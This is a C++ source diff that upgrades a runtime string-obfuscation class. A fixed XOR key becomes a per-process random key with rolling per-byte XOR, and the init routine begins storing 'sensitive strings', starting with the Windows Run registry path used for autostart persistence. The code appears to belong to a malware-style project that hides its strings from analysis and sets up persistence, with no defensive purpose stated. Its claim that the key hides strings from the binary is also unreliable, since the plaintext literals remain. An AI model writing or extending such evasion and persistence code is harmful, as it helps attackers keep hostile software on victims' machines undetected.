@@ -3,29 +3,42 @@
 #include <string>
 #include <unordered_map>
 #include <mutex>
+#include <random>
+#include <cstdint>
 
 namespace nuub::domain {
 
 // Runtime string encryption/decryption
+// Uses a per-process random XOR key derived at init time
 class StringTable {
-    static constexpr uint8_t XOR_KEY = 0x73;
+    // Per-process random key (different each run, not predictable from binary)
+    inline static uint8_t xor_key_ = 0;
     inline static std::mutex mutex_;
     inline static std::unordered_map<std::string, std::string> cache_;
+
+    static uint8_t generate_key() {
+        std::random_device rd;
+        std::mt19937 gen(rd());
+        std::uniform_int_distribution<int> dist(1, 255); // Never 0 (would be no-op)
+        return static_cast<uint8_t>(dist(gen));
+    }
 
     static std::string xor_decode(const std::string& encoded) {
         std::string result = encoded;
         for (size_t i = 0; i < result.size(); ++i) {
-            result[i] ^= static_cast<char>(XOR_KEY + (i & 0xFF));
+            // Rolling XOR: key changes per byte based on position + base key
+            uint8_t byte_key = static_cast<uint8_t>(
+                xor_key_ + ((i * 0x37) & 0xFF) + ((i >> 3) & 0x1F));
+            result[i] ^= byte_key;
         }
         return result;
     }
 
     static std::string xor_encode(const std::string& plain) {
-        return xor_decode(plain); // XOR is symmetric
+        return xor_decode(plain); // Rolling XOR is symmetric
     }
 
 public:
-    // Store and retrieve encrypted strings
     static void store(const std::string& key, const std::string& value) {
         std::lock_guard lock(mutex_);
         cache_[key] = xor_encode(value);
@@ -40,8 +53,10 @@ public:
         return "";
     }
 
-    // Initialize with all sensitive strings
     static void init() {
+        // Generate per-process random key
+        xor_key_ = generate_key();
+
         // Registry paths
         store("reg_run", "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
 
